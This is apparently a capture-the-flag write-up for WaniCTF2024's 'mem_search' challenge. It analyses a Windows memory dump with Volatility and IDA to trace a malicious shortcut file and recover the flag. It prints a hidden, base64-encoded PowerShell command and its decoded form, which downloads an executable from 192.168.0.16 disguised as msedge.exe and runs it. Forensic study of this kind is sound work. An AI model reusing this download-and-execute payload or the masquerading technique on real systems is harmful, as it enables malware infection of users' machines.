## mem_search

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/b5624000-7e14-4fe2-9dce-53c613dafd50)

## Windows Forensics

* file: chal_mem_search.DUMP

## Tool

* Volatility 3
* IDA

## Overview

* Victim found a strange file which had some suspicious behaviours

## Solution

* first check file's metadata

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/07881ba0-70de-4ff7-aee2-50948efd3e2f)

* it seams not contain any significant information
* next, check process list

`vol -f .\chal_mem_search.DUMP windows.info`

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/3aebfe0c-dc2a-4aaf-bc29-7bbc22d31205)

`vol -f .\chal_mem_search.DUMP windows.pslist`

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/7654b633-542f-4f2e-9afa-adc027a0e39d)

* process 7844 msedge.exe was run from powershell.exe(2704) which is not normal and there was a notepad.exe run from explorer.exe(3576)
* search all the txt file in this mem file

`vol -f .\chal_mem_search.DUMP windows.filescan`

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/1ddacc6a-3c67-4adf-900e-d4e50f8983ae)

* I dumped this file and got it data

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/f030adb2-172e-409a-89fd-6fd581901c3e)

* It just a fake data, so I keep looking in `\Users\Mikka` and saw this file at Downloads

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/c3378d87-39c4-4899-bbd7-f24d97647dc4)

* dump that file and read its data

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/50763768-c6fa-4cfa-8a03-9279e99379d0)

* this file was a temporary file, and the file was downloading is read_this_as_admin.lnk
* search and dump that file

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/9f129d1f-33ea-4d4f-b5c7-0e390ab51044)

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/81b5532d-a8f6-43b8-8499-5681fdb407e9)

* I saw a powershell command

```
powershell.exe -windowhidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=
```

- windowhidden: Runs PowerShell in a hidden window, making it less noticeable
- noni: Launches PowerShell without running any profile scripts, which makes the execution faster and less detectable
- enc: Indicates that the following argument is a base64-encoded string containing the actual command to be executed

* decode that base64

```
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';
$t='Wan'+'iTem'+'p';
mkdir -force $env:TMP\..\$t;
try{
    iwr $u -OutFile $d\msedge.exe;
    & $d\msedge.exe;
}
catch{
}
```

* purpose of this command is create new directory name `WaniTemp` in current_user\AppData\Local\ and try iwr(Invoke-WebRequest) to download file `msedge.exe` from private IP address
* `msedge.exe` is the executable file for Microsoft Edge, the web browser developed by Microsoft which is responsible for running the browser on Windows
* I searched msedge.exe on this mem file, the correct path of this file is `\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/7b00e2f7-e53e-49ce-96f3-7430be4b4e2e)

* but there was a process named `msedge.exe` have path in `\Device\HarddiskVolume3\msedge.exe` (in C:\) 

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/ef7b457a-cec8-4036-a63e-164d0569ab6a)

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/3ecd6dda-d5ec-4fe7-a83e-f4f95d922c89)

* so I dump that file(offset 0xcd88cebd4e10)
* use IDA to read this file data

![ảnh](https://github.com/LDV-SpaceK/WaniCTF2024/assets/151914246/f8290c78-d061-4bb7-aadb-88d935dff4b5)

* in main function, there was a base64 string, after decode I got the fake flag: `FLAG{Hacked_yikes_spooky}`
* in description of this challenge, author wrote that flag start with letter D not H, so I looked back and saw the base64 in powershell command

`B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ`

* after decoding I got the real flag

`FLAG{Dayum_this_is_secret_file}`





